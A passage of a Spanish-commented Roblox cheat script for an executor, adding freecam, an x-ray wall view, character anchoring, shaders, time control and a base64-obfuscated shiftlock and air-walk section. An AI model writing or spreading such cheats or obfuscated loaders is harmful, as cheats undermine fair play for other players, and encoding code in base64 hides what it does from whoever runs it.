	CreateButton("W", UDim2.new(0, 100, 1, -200), Enum.KeyCode.W)
	CreateButton("A", UDim2.new(0, 40, 1, -140), Enum.KeyCode.A)
	CreateButton("S", UDim2.new(0, 100, 1, -140), Enum.KeyCode.S)
	CreateButton("D", UDim2.new(0, 160, 1, -140), Enum.KeyCode.D)
end

-- Destruir GUI táctil
local function RemoveTouchGui()
	if guiFrames then
		guiFrames:Destroy()
		guiFrames = nil
	end
end

-- Teclas presionadas
UserInputService.InputBegan:Connect(function(input, gpe)
	if not gpe and freecamEnabled then
		if input.KeyCode == Enum.KeyCode.W or input.KeyCode == Enum.KeyCode.A or input.KeyCode == Enum.KeyCode.S or input.KeyCode == Enum.KeyCode.D or input.KeyCode == Enum.KeyCode.E or input.KeyCode == Enum.KeyCode.Q then
			keysHeld[input.KeyCode] = true
		end
	end
end)

UserInputService.InputEnded:Connect(function(input)
	if freecamEnabled then
		if input.KeyCode == Enum.KeyCode.W or input.KeyCode == Enum.KeyCode.A or input.KeyCode == Enum.KeyCode.S or input.KeyCode == Enum.KeyCode.D or input.KeyCode == Enum.KeyCode.E or input.KeyCode == Enum.KeyCode.Q then
			keysHeld[input.KeyCode] = false
		end
	end
end)

-- Capturar movimiento de cámara con Touch
UserInputService.TouchMoved:Connect(function(input, gpe)
	if freecamEnabled and not gpe then
		if lastTouchPosition then
			local delta = input.Position - lastTouchPosition
			camRotation = camRotation + Vector2.new(-delta.Y, -delta.X) * sensitivity * 0.1
			camRotation = Vector2.new(math.clamp(camRotation.X, -math.pi/2, math.pi/2), camRotation.Y)
		end
		lastTouchPosition = input.Position
	end
end)

UserInputService.TouchEnded:Connect(function(input, gpe)
	if not gpe then
		lastTouchPosition = nil
	end
end)

-- Calcular hacia dónde moverse
local function CalculateMoveVector()
	local moveVec = Vector3.zero

	if keysHeld[Enum.KeyCode.W] then moveVec = moveVec + Vector3.new(0, 0, -1) end
	if keysHeld[Enum.KeyCode.S] then moveVec = moveVec + Vector3.new(0, 0, 1) end
	if keysHeld[Enum.KeyCode.A] then moveVec = moveVec + Vector3.new(-1, 0, 0) end
	if keysHeld[Enum.KeyCode.D] then moveVec = moveVec + Vector3.new(1, 0, 0) end
	if keysHeld[Enum.KeyCode.E] then moveVec = moveVec + Vector3.new(0, 1, 0) end
	if keysHeld[Enum.KeyCode.Q] then moveVec = moveVec + Vector3.new(0, -1, 0) end

	return moveVec
end

local function EnableFreecam()
	if not freecamEnabled then
		freecamEnabled = true
		camera.CameraType = Enum.CameraType.Scriptable
		camPosition = camera.CFrame.Position

		local _, yaw = camera.CFrame:ToOrientation()
		local pitch = math.asin(-camera.CFrame.LookVector.Y)
		camRotation = Vector2.new(pitch, yaw)

		UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter
		UserInputService.MouseIconEnabled = false

		FreezeCharacter()

		if UserInputService.TouchEnabled then
			CreateTouchGui()
		end

		RunService:BindToRenderStep("Freecam", Enum.RenderPriority.Camera.Value, function(dt)
			if not UserInputService.TouchEnabled then
				local delta = UserInputService:GetMouseDelta()
				camRotation = camRotation + Vector2.new(-delta.Y, -delta.X) * sensitivity
				camRotation = Vector2.new(math.clamp(camRotation.X, -math.pi/2, math.pi/2), camRotation.Y)
			end

			local yawCF = CFrame.Angles(0, camRotation.Y, 0)
			local pitchCF = CFrame.Angles(camRotation.X, 0, 0)
			local moveVec = CalculateMoveVector()

			if moveVec.Magnitude > 0 then
				moveVec = (yawCF * pitchCF):VectorToWorldSpace(moveVec.Unit) * speed
				camPosition = camPosition + moveVec
			end

			camera.CFrame = yawCF * pitchCF + camPosition
		end)
	end
end

local function DisableFreecam()
	if freecamEnabled then
		freecamEnabled = false
		RunService:UnbindFromRenderStep("Freecam")
		camera.CameraType = Enum.CameraType.Custom

		UserInputService.MouseBehavior = Enum.MouseBehavior.Default
		UserInputService.MouseIconEnabled = true

		UnfreezeCharacter()
		RemoveTouchGui()
	end
end

-- Toggle de cámara
MainTab:CreateToggle({
	Name = "Camara libre",
	CurrentValue = false,
	Flag = "CamaraL",
	Callback = function(Value)
		toggleActive = Value
		if Value then
			EnableFreecam()
		else
			DisableFreecam()
		end
	end,
})

-- Keybind de activación
MainTab:CreateKeybind({
	Name = "Bind Camara Libre",
	CurrentKeybind = "P",
	HoldToInteract = false,
	Flag = "CamaraLKeybind",
	Callback = function()
		if toggleActive then
			if freecamEnabled then
				DisableFreecam()
			else
				EnableFreecam()
			end
		end
	end,
})

-- Slider de sensibilidad
MainTab:CreateSlider({
	Name = "Sensibilidad de cámara",
	Range = {0.001, 0.049},
	Increment = 0.001,
	Suffix = "Sensibilidad",
	CurrentValue = sensitivity,
	Flag = "CameraSensitivity",
	Callback = function(Value)
		sensitivity = Value
	end,
})


-- Slider de velocidad
MainTab:CreateSlider({
	Name = "Velocidad de camara",
	Range = {0.1, 10},
	Increment = 0.1,
	Suffix = "Velocidad",
	CurrentValue =  speed,
	Flag = "speed",
	Callback = function(Value)
		 speed  = Value
	end,
})























--XRAY----

-- Tabla para guardar las transparencias originales
local originalTransparency = {}

-- Función que activa o desactiva el Xray
function ToggleXray(state)
    for _, object in pairs(workspace:GetDescendants()) do
        if object:IsA("BasePart") then
            if not object:IsA("Model") or not object:FindFirstChild("Humanoid") then
                if not object:IsA("Part") or object.Name ~= "SpawnLocation" then
                    if not (object.Parent and object.Parent:FindFirstChild("HumanoidRootPart")) then
                        if state then
                            -- Guardar la transparencia original si no está guardada ya
                            if originalTransparency[object] == nil then
                                originalTransparency[object] = object.Transparency
                            end
                            object.Transparency = 0.8
                        else
                            -- Restaurar la transparencia original si se había guardado
                            if originalTransparency[object] ~= nil then
                                object.Transparency = originalTransparency[object]
                                originalTransparency[object] = nil
                            end
                        end
                    end
                end
            end
        end
    end
end

-- Crear el toggle de Xray
XrayToggle = MainTab:CreateToggle({
    Name = "Xray", 
    CurrentValue = false,
    Callback = function(state)
        ToggleXray(state)
    end
})



----Anclar----

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local RunService = game:GetService("RunService")



getgenv().AnchoredStatus = false
local anchorConnection

-- Función para anclar o desanclar todas las partes del personaje
local function setAnchored(state)
    local character = LocalPlayer.Character
    if character then
        for _, part in ipairs(character:GetDescendants()) do
            if part:IsA("BasePart") then
                part.Anchored = state
            end
        end
    end
end

-- Toggle de Rayfield para activar o desactivar el anclaje
MainTab:CreateToggle({
    Name = "Anclar Personaje",
    CurrentValue = false,
    Flag = "AnchorToggle",
    Callback = function(state)
        getgenv().AnchoredStatus = state
        if state then
            setAnchored(true)
            -- Opcional: mantener anclado por si muere o respawnea
            anchorConnection = RunService.Heartbeat:Connect(function()
                if getgenv().AnchoredStatus then
                    setAnchored(true)
                end
            end)
        else
            setAnchored(false)
            if anchorConnection then
                anchorConnection:Disconnect()
                anchorConnection = nil
            end
        end
    end,
})



--Shader--


-- Referencia a Lighting

-- Variables para guardar el estado original
local originalSettings = {
    Brightness = nil,
    ExposureCompensation = nil,
    ClockTime = nil,
    Sky = nil,
    Effects = {},
}

-- Función para guardar el estado actual de Lighting
local function SaveLightingState()
    -- Guardar solo si no ha sido guardado previamente
    originalSettings.Brightness = Lighting.Brightness
    originalSettings.ExposureCompensation = Lighting.ExposureCompensation
    originalSettings.ClockTime = Lighting.ClockTime

    -- Guardar efectos y cielo actuales
    originalSettings.Effects = {}
    for _, v in ipairs(Lighting:GetChildren()) do
        if v:IsA("PostEffect") then
            table.insert(originalSettings.Effects, v:Clone()) -- Guardar clones para restaurar
        elseif v:IsA("Sky") then
            originalSettings.Sky = v:Clone() -- Guardar el objeto cielo
        end
    end
end

-- Función para restaurar el estado original
local function RestoreLightingState()
    -- Eliminar efectos actuales
    for _, v in ipairs(Lighting:GetChildren()) do
        if v:IsA("PostEffect") or v:IsA("Sky") then
            v:Destroy()
        end
    end

    -- Restaurar valores originales
    Lighting.Brightness = originalSettings.Brightness
    Lighting.ExposureCompensation = originalSettings.ExposureCompensation
    Lighting.ClockTime = originalSettings.ClockTime

    -- Restaurar cielo
    if originalSettings.Sky then
        originalSettings.Sky.Parent = Lighting
    end

    -- Restaurar efectos
    for _, effect in ipairs(originalSettings.Effects) do
        if effect.Parent == nil then
            effect.Parent = Lighting
        end
    end
end

-- Función para aplicar los shaders
local function ApplyShaders()
    -- Crear y aplicar los efectos de shaders
    local Sky = Instance.new("Sky")
    local Bloom = Instance.new("BloomEffect")
    local Blur = Instance.new("BlurEffect")
    local ColorC = Instance.new("ColorCorrectionEffect")
    local SunRays = Instance.new("SunRaysEffect")

    -- Ajustes visuales
    Lighting.Brightness = 2.25
    Lighting.ExposureCompensation = 0.1
    Lighting.ClockTime = 17.55

    -- Configuración del cielo y efectos
    Sky.SkyboxBk = "http://www.roblox.com/asset/?id=144933338"
    Sky.SkyboxDn = "http://www.roblox.com/asset/?id=144931530"
    Sky.SkyboxFt = "http://www.roblox.com/asset/?id=144933262"
    Sky.SkyboxLf = "http://www.roblox.com/asset/?id=144933244"
    Sky.SkyboxRt = "http://www.roblox.com/asset/?id=144933299"
    Sky.SkyboxUp = "http://www.roblox.com/asset/?id=144931564"
    Sky.StarCount = 5000
    Sky.SunAngularSize = 5
    Sky.Parent = Lighting

    Bloom.Intensity = 0.3
    Bloom.Size = 10
    Bloom.Threshold = 0.8
    Bloom.Parent = Lighting

    Blur.Size = 5
    Blur.Parent = Lighting

    ColorC.Brightness = 0
    ColorC.Contrast = 0.1
    ColorC.Saturation = 0.25
    ColorC.TintColor = Color3.fromRGB(255, 255, 255)
    ColorC.Parent = Lighting

    SunRays.Intensity = 0.1
    SunRays.Spread = 0.8
    SunRays.Parent = Lighting
end

-- Estado del shader
local shadersEnabled = false

-- Toggle para activar/desactivar shaders
toggleShader = MainTab:CreateToggle({
    Name = "Shader",
    Callback = function()
        shadersEnabled = not shadersEnabled
        if shadersEnabled then
            SaveLightingState()  -- Guardamos el estado antes de aplicar los shaders
            ApplyShaders()       -- Activamos los shaders
        else
            RestoreLightingState()  -- Restauramos el estado anterior
        end
    end
})

local Lighting = game:GetService("Lighting")

-- Guardar configuración original
local originalClockTime = Lighting.ClockTime
local userSelectedTime = originalClockTime
local isCustomTimeEnabled = false

-- Toggle para activar/desactivar la hora personalizada
MainTab:CreateToggle({
   Name = "Activar hora personalizada",
   CurrentValue = false,
   Callback = function(state)
       isCustomTimeEnabled = state
       if state then
           Lighting.ClockTime = userSelectedTime
       else
           Lighting.ClockTime = originalClockTime
       end
   end,
})

-- Slider para cambiar el tiempo del juego
MainTab:CreateSlider({
   Name = "Hora del juego",
   Range = {0, 24},
   Increment = 0.1,
   Suffix = "h",
   CurrentValue = originalClockTime,
   Callback = function(value)
       userSelectedTime = value
       if isCustomTimeEnabled then
           Lighting.ClockTime = value
       end
   end,
})


---Shiftlock



-- Función para decodificar Base64
local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
local function base64decode(data)
	data = string.gsub(data, '[^'..b..'=]', '')
	return (data:gsub('.', function(x)
		if x == '=' then return '' end
		local r,f='',(b:find(x)-1)
		for i=6,1,-1 do r=r..(f%2^i - f%2^(i-1) > 0 and '1' or '0') end
		return r
	end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
		if #x ~= 8 then return '' end
		local c=0
		for i=1,8 do c=c + (x:sub(i,i)=='1' and 2^(8-i) or 0) end
		return string.char(c)
	end))
end

-- Aquí va el script codificado en base64
local encoded = [[
LS0gU2VydmljaW9zCmxvY2FsIFBsYXllcnMgPSBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKQpsb2NhbCBSdW5TZXJ2aWNlID0gZ2FtZTpHZXRTZXJ2aWNlKCJSdW5TZXJ2aWNlIikKbG9jYWwgVHdlZW5TZXJ2aWNlID0gZ2FtZTpHZXRTZXJ2aWNlKCJUd2VlblNlcnZpY2UiKQpsb2NhbCBVc2VySW5wdXRTZXJ2aWNlID0gZ2FtZTpHZXRTZXJ2aWNlKCJVc2VySW5wdXRTZXJ2aWNlIikKbG9jYWwgU291bmRTZXJ2aWNlID0gZ2FtZTpHZXRTZXJ2aWNlKCJTb3VuZFNlcnZpY2UiKQpsb2NhbCBWb2ljZUNoYXRTZXJ2aWNlID0gZ2FtZTpHZXRTZXJ2aWNlKCJWb2ljZUNoYXRTZXJ2aWNlIikKCmxvY2FsIHBsYXllciA9IFBsYXllcnMuTG9jYWxQbGF5ZXIKbG9jYWwgY2FtZXJhID0gd29ya3NwYWNlLkN1cnJlbnRDYW1lcmEKbG9jYWwgY2hhcmFjdGVyID0gcGxheWVyLkNoYXJhY3RlciBvciBwbGF5ZXIuQ2hhcmFjdGVyQWRkZWQ6V2FpdCgpCmxvY2FsIGh1bWFub2lkID0gY2hhcmFjdGVyOldhaXRGb3JDaGlsZCgiSHVtYW5vaWQiKQpsb2NhbCByb290ID0gY2hhcmFjdGVyOldhaXRGb3JDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCgotLSBTaGlmdGxvY2sgdmFyaWFibGVzCmxvY2FsIHNoaWZ0bG9ja0VuYWJsZWQgPSBmYWxzZQpsb2NhbCBzaGlmdGxvY2tLZXliaW5kID0gRW51bS5LZXlDb2RlLlEKbG9jYWwgaXNBY3RpdmUgPSBmYWxzZQpsb2NhbCBjYW1lcmFDb25uZWN0aW9uID0gbmlsCgotLSBHVUkgU2hpZnRsb2NrCmxvY2FsIFNoaWZ0bG9ja0d1aSA9IEluc3RhbmNlLm5ldygiU2NyZWVuR3VpIikKU2hpZnRsb2NrR3VpLk5hbWUgPSAiU2hpZnRsb2NrR1VJIgpTaGlmdGxvY2tHdWkuUmVzZXRPblNwYXduID0gZmFsc2UKU2hpZnRsb2NrR3VpLlpJbmRleEJlaGF2aW9yID0gRW51bS5aSW5kZXhCZWhhdmlvci5TaWJsaW5nClNoaWZ0bG9ja0d1aS5QYXJlbnQgPSBwbGF5ZXI6V2FpdEZvckNoaWxkKCJQbGF5ZXJHdWkiKQoKbG9jYWwgQnV0dG9uID0gSW5zdGFuY2UubmV3KCJJbWFnZUJ1dHRvbiIpCkJ1dHRvbi5OYW1lID0gIlNoaWZ0bG9ja0J1dHRvbiIKQnV0dG9uLlBhcmVudCA9IFNoaWZ0bG9ja0d1aQpCdXR0b24uQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKQnV0dG9uLlNpemUgPSBVRGltMi5uZXcoMC4wNjM2LCAwLCAwLjA2NjEsIDApCkJ1dHRvbi5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLjkyMTksIDAsIDAuNTUyMywgMCkKQnV0dG9uLlNpemVDb25zdHJhaW50ID0gRW51bS5TaXplQ29uc3RyYWludC5SZWxhdGl2ZVhYCkJ1dHRvbi5WaXNpYmxlID0gZmFsc2UKCmxvY2FsIFN0YXRlTGFiZWxGcmFtZSA9IEluc3RhbmNlLm5ldygiRnJhbWUiKQpTdGF0ZUxhYmVsRnJhbWUuUGFyZW50ID0gQnV0dG9uClN0YXRlTGFiZWxGcmFtZS5TaXplID0gVURpbTIubmV3KDEsIDAsIDEsIDApClN0YXRlTGFiZWxGcmFtZS5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMC41ClN0YXRlTGFiZWxGcmFtZS5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLm5ldygwLCAwLCAwKQoKbG9jYWwgU3RhdGVMYWJlbCA9IEluc3RhbmNlLm5ldygiVGV4dExhYmVsIikKU3RhdGVMYWJlbC5QYXJlbnQgPSBTdGF0ZUxhYmVsRnJhbWUKU3RhdGVMYWJlbC5TaXplID0gVURpbTIubmV3KDEsIDAsIDEsIDApClN0YXRlTGFiZWwuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKU3RhdGVMYWJlbC5UZXh0ID0gIk9GRiIKU3RhdGVMYWJlbC5UZXh0Q29sb3IzID0gQ29sb3IzLm5ldygxLCAxLCAxKQpTdGF0ZUxhYmVsLlRleHRTY2FsZWQgPSB0cnVlClN0YXRlTGFiZWwuRm9udCA9IEVudW0uRm9udC5Tb3VyY2VTYW5zQm9sZAoKbG9jYWwgQ3Jvc3NoYWlyID0gSW5zdGFuY2UubmV3KCJUZXh0TGFiZWwiKQpDcm9zc2hhaXIuUGFyZW50ID0gU2hpZnRsb2NrR3VpCkNyb3NzaGFpci5TaXplID0gVURpbTIubmV3KDAsIDMwLCAwLCAzMCkKQ3Jvc3NoYWlyLlBvc2l0aW9uID0gVURpbTIubmV3KDAuNSwgLTE1LCAwLjUsIC0xNSkKQ3Jvc3NoYWlyLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCkNyb3NzaGFpci5UZXh0ID0gIk8iCkNyb3NzaGFpci5UZXh0U2NhbGVkID0gdHJ1ZQpDcm9zc2hhaXIuVGV4dENvbG9yMyA9IENvbG9yMy5uZXcoMSwgMSwgMSkKQ3Jvc3NoYWlyLlZpc2libGUgPSBmYWxzZQoKLS0gRnVuY2lvbmVzIFNoaWZ0bG9jawpsb2NhbCBmdW5jdGlvbiBVcGRhdGVJbWFnZShzdGF0ZSkKCVN0YXRlTGFiZWwuVGV4dCA9IHN0YXRlCmVuZAoKbG9jYWwgZnVuY3Rpb24gVXBkYXRlQXV0b1JvdGF0ZShzdGF0ZSkKCWlmIGh1bWFub2lkIHRoZW4KCQlodW1hbm9pZC5BdXRvUm90YXRlID0gc3RhdGUKCWVuZAplbmQKCmxvY2FsIGZ1bmN0aW9uIEFuaW1hdGVCdXR0b25QcmVzcygpCglsb2NhbCB0d2VlbkluZm8gPSBUd2VlbkluZm8ubmV3KDAuMTUsIEVudW0uRWFzaW5nU3R5bGUuUXVhZCwgRW51bS5FYXNpbmdEaXJlY3Rpb24uT3V0KQoJbG9jYWwgc2hyaW5rU2l6ZSA9IEJ1dHRvbi5TaXplIC0gVURpbTIubmV3KDAuMDEsIDAsIDAuMDEsIDApCglsb2NhbCB0d2VlblNocmluayA9IFR3ZWVuU2VydmljZTpDcmVhdGUoQnV0dG9uLCB0d2VlbkluZm8sIHsgU2l6ZSA9IHNocmlua1NpemUgfSkKCWxvY2FsIHR3ZWVuR3JvdyA9IFR3ZWVuU2VydmljZTpDcmVhdGUoQnV0dG9uLCB0d2VlbkluZm8sIHsgU2l6ZSA9IFVEaW0yLm5ldygwLjA2MzYsIDAsIDAuMDY2MSwgMCkgfSkKCXR3ZWVuU2hyaW5rOlBsYXkoKQoJdHdlZW5TaHJpbmsuQ29tcGxldGVkOkNvbm5lY3QoZnVuY3Rpb24oKQoJCXR3ZWVuR3JvdzpQbGF5KCkKCWVuZCkKZW5kCgpsb2NhbCBmdW5jdGlvbiBTaGlmdExvY2tUb2dnbGUoKQoJaWYgbm90ICgoY2FtZXJhLkNhbWVyYVN1YmplY3QgPT0gaHVtYW5vaWQgb3IgY2FtZXJhLkNhbWVyYVN1YmplY3QgPT0gcm9vdCkgYW5kIGNhbWVyYS5DYW1lcmFUeXBlID09IEVudW0uQ2FtZXJhVHlwZS5DdXN0b20pIHRoZW4KCQlyZXR1cm4KCWVuZAoKCUFuaW1hdGVCdXR0b25QcmVzcygpCgoJaWYgbm90IGlzQWN0aXZlIHRoZW4KCQlpc0FjdGl2ZSA9IHRydWUKCQlVcGRhdGVBdXRvUm90YXRlKGZhbHNlKQoJCVVwZGF0ZUltYWdlKCJPTiIpCgkJQ3Jvc3NoYWlyLlZpc2libGUgPSB0cnVlCgkJVXNlcklucHV0U2VydmljZS5Nb3VzZUljb25FbmFibGVkID0gZmFsc2UKCQlVc2VySW5wdXRTZXJ2aWNlLk1vdXNlQmVoYXZpb3IgPSBFbnVtLk1vdXNlQmVoYXZpb3IuTG9ja0NlbnRlcgoKCQljYW1lcmFDb25uZWN0aW9uID0gUnVuU2VydmljZS5SZW5kZXJTdGVwcGVkOkNvbm5lY3QoZnVuY3Rpb24oKQoJCQlpZiBjaGFyYWN0ZXIgYW5kIHJvb3QgYW5kIGNhbWVyYSB0aGVuCgkJCQlsb2NhbCBkaXJlY3Rpb24gPSBjYW1lcmEuQ0ZyYW1lLkxvb2tWZWN0b3IKCQkJCWxvY2FsIGZsYXREaXJlY3Rpb24gPSBWZWN0b3IzLm5ldyhkaXJlY3Rpb24uWCwgMCwgZGlyZWN0aW9uLlopCgkJCQlpZiBmbGF0RGlyZWN0aW9uLk1hZ25pdHVkZSA+IDAgdGhlbgoJCQkJCXJvb3QuQ0ZyYW1lID0gQ0ZyYW1lLm5ldyhyb290LlBvc2l0aW9uLCByb290LlBvc2l0aW9uICsgZmxhdERpcmVjdGlvbikKCQkJCWVuZAoJCQllbmQKCQllbmQpCgllbHNlCgkJaXNBY3RpdmUgPSBmYWxzZQoJCVVwZGF0ZUF1dG9Sb3RhdGUodHJ1ZSkKCQlVcGRhdGVJbWFnZSgiT0ZGIikKCQlDcm9zc2hhaXIuVmlzaWJsZSA9IGZhbHNlCgkJVXNlcklucHV0U2VydmljZS5Nb3VzZUljb25FbmFibGVkID0gdHJ1ZQoJCVVzZXJJbnB1dFNlcnZpY2UuTW91c2VCZWhhdmlvciA9IEVudW0uTW91c2VCZWhhdmlvci5EZWZhdWx0CgoJCWlmIGNhbWVyYUNvbm5lY3Rpb24gdGhlbgoJCQljYW1lcmFDb25uZWN0aW9uOkRpc2Nvbm5lY3QoKQoJCQljYW1lcmFDb25uZWN0aW9uID0gbmlsCgkJZW5kCgllbmQKZW5kCgpwbGF5ZXIuQ2hhcmFjdGVyQWRkZWQ6Q29ubmVjdChmdW5jdGlvbihjaGFyKQoJY2hhcmFjdGVyID0gY2hhcgoJaHVtYW5vaWQgPSBjaGFyYWN0ZXI6V2FpdEZvckNoaWxkKCJIdW1hbm9pZCIpCglyb290ID0gY2hhcmFjdGVyOldhaXRGb3JDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCglpZiBpc0FjdGl2ZSB0aGVuCgkJVXBkYXRlQXV0b1JvdGF0ZShmYWxzZSkKCWVuZAplbmQpCgpCdXR0b24uTW91c2VCdXR0b24xQ2xpY2s6Q29ubmVjdChmdW5jdGlvbigpCglpZiBzaGlmdGxvY2tFbmFibGVkIHRoZW4KCQlTaGlmdExvY2tUb2dnbGUoKQoJZW5kCmVuZCkKClVzZXJJbnB1dFNlcnZpY2UuSW5wdXRCZWdhbjpDb25uZWN0KGZ1bmN0aW9uKGlucHV0LCBncCkKCWlmIGdwIHRoZW4gcmV0dXJuIGVuZAoJaWYgbm90IFVzZXJJbnB1dFNlcnZpY2UuVG91Y2hFbmFibGVkIGFuZCBzaGlmdGxvY2tFbmFibGVkIGFuZCBpbnB1dC5LZXlDb2RlID09IHNoaWZ0bG9ja0tleWJpbmQgdGhlbgoJCVNoaWZ0TG9ja1RvZ2dsZSgpCgllbmQKZW5kKQoKVXBkYXRlSW1hZ2UoIk9GRiIpCgotLSBUb2dnbGUgU2hpZnRsb2NrCk1haW5UYWI6Q3JlYXRlVG9nZ2xlKHsKCU5hbWUgPSAiU2hpZnRsb2NrIFEgcGFyYSBhY3RpdmFyIiwKCUN1cnJlbnRWYWx1ZSA9IGZhbHNlLAoJRmxhZyA9ICJTaGlmdGxvY2tUb2dnbGUiLAoJQ2FsbGJhY2sgPSBmdW5jdGlvbihWYWx1ZSkKCQlzaGlmdGxvY2tFbmFibGVkID0gVmFsdWUKCQlCdXR0b24uVmlzaWJsZSA9IHNoaWZ0bG9ja0VuYWJsZWQgYW5kIFVzZXJJbnB1dFNlcnZpY2UuVG91Y2hFbmFibGVkCgkJaWYgbm90IHNoaWZ0bG9ja0VuYWJsZWQgYW5kIGlzQWN0aXZlIHRoZW4KCQkJaXNBY3RpdmUgPSBmYWxzZQoJCQlVcGRhdGVBdXRvUm90YXRlKHRydWUpCgkJCVVwZGF0ZUltYWdlKCJPRkYiKQoJCQlDcm9zc2hhaXIuVmlzaWJsZSA9IGZhbHNlCgkJCVVzZXJJbnB1dFNlcnZpY2UuTW91c2VJY29uRW5hYmxlZCA9IHRydWUKCQkJVXNlcklucHV0U2VydmljZS5Nb3VzZUJlaGF2aW9yID0gRW51bS5Nb3VzZUJlaGF2aW9yLkRlZmF1bHQKCQkJaWYgY2FtZXJhQ29ubmVjdGlvbiB0aGVuCgkJCQljYW1lcmFDb25uZWN0aW9uOkRpc2Nvbm5lY3QoKQoJCQkJY2FtZXJhQ29ubmVjdGlvbiA9IG5pbAoJCQllbmQKCQllbmQKCWVuZAp9KQoKLS0gQ2FtaW5hciBlbiBlbCBhaXJlCmxvY2FsIGlzV2Fsa2luZ0luQWlyID0gZmFsc2UKbG9jYWwgZmxvb3JQYXJ0ID0gbmlsCmxvY2FsIGhlYXJ0YmVhdENvbm5lY3Rpb24gPSBuaWwKCmxvY2FsIGZ1bmN0aW9uIGlzVG91Y2hpbmdHcm91bmQoKQoJbG9jYWwgcmF5ID0gUmF5Lm5ldyhyb290LlBvc2l0aW9uLCBWZWN0b3IzLm5ldygwLCAtNSwgMCkpCglsb2NhbCBoaXRQYXJ0ID0gd29ya3NwYWNlOkZpbmRQYXJ0T25SYXkocmF5LCBjaGFyYWN0ZXIpCglyZXR1cm4gaGl0UGFydCBhbmQgaGl0UGFydC5DYW5Db2xsaWRlCmVuZAoKbG9jYWwgZnVuY3Rpb24gY3JlYXRlRmxvb3IoKQoJaWYgbm90IGZsb29yUGFydCB0aGVuCgkJZmxvb3JQYXJ0ID0gSW5zdGFuY2UubmV3KCJQYXJ0IikKCQlmbG9vclBhcnQuU2l6ZSA9IFZlY3RvcjMubmV3KDUwLCAxLCA1MCkKCQlmbG9vclBhcnQuQW5jaG9yZWQgPSB0cnVlCgkJZmxvb3JQYXJ0LkNhbkNvbGxpZGUgPSB0cnVlCgkJZmxvb3JQYXJ0LlRyYW5zcGFyZW5jeSA9IDEKCQlmbG9vclBhcnQuUGFyZW50ID0gd29ya3NwYWNlCgllbmQKZW5kCgpNYWluVGFiOkNyZWF0ZVRvZ2dsZSh7CglOYW1lID0gIkNhbWluYXIgZW4gZWwgYWlyZSIsCglDdXJyZW50VmFsdWUgPSBpc1dhbGtpbmdJbkFpciwKCUZsYWcgPSAid2Fsa0luQWlyVG9nZ2xlIiwKCUNhbGxiYWNrID0gZnVuY3Rpb24oVmFsdWUpCgkJaXNXYWxraW5nSW5BaXIgPSBWYWx1ZQoKCQlpZiBpc1dhbGtpbmdJbkFpciB0aGVuCgkJCWNyZWF0ZUZsb29yKCkKCQkJaWYgbm90IGhlYXJ0YmVhdENvbm5lY3Rpb24gdGhlbgoJCQkJaGVhcnRiZWF0Q29ubmVjdGlvbiA9IFJ1blNlcnZpY2UuSGVhcnRiZWF0OkNvbm5lY3QoZnVuY3Rpb24oKQoJCQkJCWlmIGlzV2Fsa2luZ0luQWlyIGFuZCBmbG9vclBhcnQgYW5kIG5vdCBpc1RvdWNoaW5nR3JvdW5kKCkgdGhlbgoJCQkJCQlmbG9vclBhcnQuUG9zaXRpb24gPSByb290LlBvc2l0aW9uIC0gVmVjdG9yMy5uZXcoMCwgMywgMCkKCQkJCQllbmQKCQkJCWVuZCkKCQkJZW5kCgkJZWxzZQoJCQlpZiBmbG9vclBhcnQgdGhlbgoJCQkJZmxvb3JQYXJ0OkRlc3Ryb3koKQoJCQkJZmxvb3JQYXJ0ID0gbmlsCgkJCWVuZAoJCQlpZiBoZWFydGJlYXRDb25uZWN0aW9uIHRoZW4KCQkJCWhlYXJ0YmVhdENvbm5lY3Rpb246RGlzY29ubmVjdCgpCgkJCQloZWFydGJlYXRDb25uZWN0aW9uID0gbmlsCgkJCWVuZAoJCWVuZAoJZW5kLAp9KQoKLS0gTXV0ZWFyIHNvbmlkb3MgZXhjZXB0byB2b3oKbG9jYWwgbXV0ZWRTb3VuZHMgPSB7fQpsb2NhbCB0b2dnbGVBY3RpdmUgPSBmYWxzZQoKbG9jYWwgZnVuY3Rpb24gaXNWb2ljZVNvdW5kKHNvdW5kKQoJaWYgc291bmQ6SXNEZXNjZW5kYW50T2YoVm9pY2VDaGF0U2VydmljZSkgdGhlbiByZXR1cm4gdHJ1ZSBlbmQKCWxvY2FsIG5hbWUgPSBzb3VuZC5OYW1lOmxvd2VyKCkKCXJldHVybiBuYW1lOmZpbmQoInZvaWNlIikgb3IgbmFtZTpmaW5kKCJ2YyIpCmVuZAoKbG9jYWwgZnVuY3Rpb24gbXV0ZUFsbEV4Y2VwdFZvaWNlKCkKCWZvciBfLCBzb3VuZCBpbiBpcGFpcnMoZ2FtZTpHZXREZXNjZW5kYW50cygpKSBkbwoJCWlmIHNvdW5kOklzQSgiU291bmQiKSBhbmQgbm90IGlzVm9pY2VTb3VuZChzb3VuZCkgdGhlbgoJCQlpZiBzb3VuZC5QbGF5aW5nIGFuZCBzb3VuZC5Wb2x1bWUgPiAwIHRoZW4KCQkJCW11dGVkU291bmRzW3NvdW5kXSA9IHNvdW5kLlZvbHVtZQoJCQkJc291bmQuVm9sdW1lID0gMAoJCQllbmQKCQllbmQKCWVuZAplbmQKCmxvY2FsIGZ1bmN0aW9uIHVubXV0ZUFsbCgpCglmb3Igc291bmQsIHZvbCBpbiBwYWlycyhtdXRlZFNvdW5kcykgZG8KCQlpZiBzb3VuZCBhbmQgc291bmQuUGFyZW50IHRoZW4KCQkJc291bmQuVm9sdW1lID0gdm9sCgkJZW5kCgllbmQKCW11dGVkU291bmRzID0ge30KZW5kCgpnYW1lLkRlc2NlbmRhbnRBZGRlZDpDb25uZWN0KGZ1bmN0aW9uKHNvdW5kKQoJaWYgdG9nZ2xlQWN0aXZlIGFuZCBzb3VuZDpJc0EoIlNvdW5kIikgYW5kIG5vdCBpc1ZvaWNlU291bmQoc291bmQpIHRoZW4KCQltdXRlZFNvdW5kc1tzb3VuZF0gPSBzb3VuZC5W